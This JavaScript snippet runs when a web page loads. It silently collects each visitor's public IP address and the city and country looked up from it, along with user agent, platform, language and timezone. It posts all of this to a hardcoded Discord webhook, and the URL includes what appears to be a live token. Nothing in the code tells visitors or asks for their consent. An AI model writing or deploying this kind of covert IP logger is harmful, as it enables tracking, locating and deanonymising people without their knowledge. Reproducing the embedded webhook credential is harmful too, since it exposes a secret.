// Function to send visitor info to Discord webhook
async function sendVisitorInfoToDiscord() {
    try {
        // Get IP address using ipify API
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ip = ipData.ip;

        // Get location data using ip-api (using HTTPS)
        const locationResponse = await fetch(`https://ip-api.com/json/${ip}`);
        const locationData = await locationResponse.json();

        // Get basic device info
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        // Prepare data for Discord webhook
        const visitorData = {
            embeds: [{
                title: "New Visitor Information",
                color: 0x00ff00,
                fields: [
                    {
                        name: "IP Address",
                        value: ip,
                        inline: true
                    },
                    {
                        name: "Location", 
                        value: `${locationData.city}, ${locationData.country}`,
                        inline: true
                    },
                    {
                        name: "Device Info",
                        value: `Platform: ${platform}\nLanguage: ${language}`,
                        inline: false
                    },
                    {
                        name: "User Agent",
                        value: userAgent,
                        inline: false
                    },
                    {
                        name: "Timezone",
                        value: timezone,
                        inline: true
                    }
                ],
                timestamp: new Date().toISOString()
            }]
        };

        // Send to Discord webhook
        // Note: Replace this with your actual Discord webhook URL
        const webhookUrl = 'https://discord.com/api/webhooks/1325852408311709728/E_gt9M3fUHdifgFFMi1OLX6GMJkqCeLsfQbZpSAkndBUyJexju7exmP8tvvkTOGKVK1r';
        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(visitorData)
        });

    } catch (error) {
        console.error('Error sending visitor information:', error);
    }
}

// Call the function when page loads
document.addEventListener('DOMContentLoaded', sendVisitorInfoToDiscord);
